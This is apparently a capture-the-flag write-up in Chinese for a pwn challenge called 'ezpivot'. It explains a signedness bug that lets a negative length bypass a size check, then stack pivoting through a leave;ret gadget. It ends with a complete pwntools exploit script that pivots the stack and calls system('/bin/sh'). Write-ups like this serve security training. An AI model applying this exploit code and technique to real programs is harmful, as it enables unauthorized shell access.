# ezpivot

脑雾传奇之永远记不住system调用要多大的栈空间

输入introduction的长度时可以输负数，绕过0x20的长度限制；随后introduce中调用read，先前输入的负数会转成ulong

至于栈迁移，二级结论如下：
- 将rbp覆盖成要跳转的地址-8
- 返回地址覆盖成`leave;ret` gadget

magic里提供了pop rdi的gadget；system的调用在假backdoor里有。注意用`add rsp,0x8`腾出足够的空间给system，不然会报错（gdb跟进会发现system内部有类似`sub rsp,0x388`之类的语句，地址不够高的话就会引用不可写的空间）
```py
from pwn import *
p=remote()
p.sendlineafter("tion.",'-1')
p.sendline(b'/bin/sh\x00'+p64(0x00401016)*256+p64(0x00401219)+p64(0x00404060)+p64(0x00401230))
p.sendafter(":",b'a'*(0x14-8)+p64(0x00404060)+p64(0x0040133e))
p.interactive()
```